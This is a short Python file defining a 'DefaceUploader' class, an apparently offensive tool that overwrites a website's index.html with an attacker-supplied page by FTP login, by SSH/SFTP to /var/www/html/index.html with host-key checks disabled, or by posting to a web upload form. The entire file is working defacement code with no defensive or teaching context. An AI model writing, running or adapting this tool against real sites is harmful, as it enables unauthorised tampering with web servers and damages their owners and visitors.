import os
import ftplib
import paramiko
import requests
from colorama import Fore, Style

class DefaceUploader:
    def upload_via_ftp(self, local_file, host, username, password):
        """Upload via FTP"""
        print(f"{Fore.CYAN}[*] FTP Upload: {local_file} -> {host}{Style.RESET_ALL}")
        
        if not os.path.exists(local_file):
            print(f"{Fore.RED}[!] File not found: {local_file}{Style.RESET_ALL}")
            return
        
        try:
            ftp = ftplib.FTP(host)
            ftp.login(username, password)
            
            with open(local_file, 'rb') as f:
                ftp.storbinary('STOR index.html', f)
            
            ftp.quit()
            print(f"{Fore.GREEN}[✓] Upload successful via FTP{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] FTP Error: {e}{Style.RESET_ALL}")
    
    def upload_via_ssh(self, local_file, host, username, password):
        """Upload via SSH/SCP"""
        print(f"{Fore.CYAN}[*] SSH Upload: {local_file} -> {host}{Style.RESET_ALL}")
        
        if not os.path.exists(local_file):
            print(f"{Fore.RED}[!] File not found{Style.RESET_ALL}")
            return
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password)
            
            sftp = ssh.open_sftp()
            sftp.put(local_file, '/var/www/html/index.html')
            sftp.close()
            ssh.close()
            
            print(f"{Fore.GREEN}[✓] Upload successful via SSH{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] SSH Error: {e}{Style.RESET_ALL}")
    
    def upload_via_web(self, local_file, upload_url):
        """Upload via web form (generic)"""
        print(f"{Fore.CYAN}[*] Web Upload to: {upload_url}{Style.RESET_ALL}")
        
        try:
            with open(local_file, 'rb') as f:
                files = {'file': ('index.html', f, 'text/html')}
                response = requests.post(upload_url, files=files)
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[✓] Upload successful (HTTP 200){Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Upload failed: HTTP {response.status_code}{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Web upload error: {e}{Style.RESET_ALL}")
